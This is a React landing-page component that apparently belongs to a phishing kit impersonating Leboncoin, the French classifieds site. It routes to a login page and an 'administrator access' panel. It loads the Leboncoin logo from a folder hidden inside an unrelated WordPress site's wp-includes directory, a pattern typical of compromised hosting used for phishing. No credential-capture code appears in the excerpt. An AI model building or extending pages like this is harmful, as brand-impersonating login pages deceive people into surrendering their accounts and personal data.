
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";

const Index = () => {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-white">
      <div className="max-w-md w-full space-y-8 text-center">
        <div className="mb-10">
          <img 
            src="https://shobha-yadav.dmlearning.in/wp-includes/html-api/lbc/Félicitation_fichiers/lbc-front-web-logo.svg" 
            alt="Leboncoin" 
            className="h-10 mx-auto"
          />
        </div>
        
        <div className="space-y-4">
          <Button 
            onClick={() => navigate("/login")} 
            className="w-full bg-leboncoin-orange hover:bg-leboncoin-orange/90"
          >
            Se connecter
          </Button>
          
          <Button 
            onClick={() => navigate("/admin")} 
            variant="outline" 
            className="w-full border-leboncoin-orange text-leboncoin-orange hover:bg-leboncoin-orange/10"
          >
            Accès administrateur
          </Button>
        </div>
      </div>
    </div>
  );
};

export default Index;
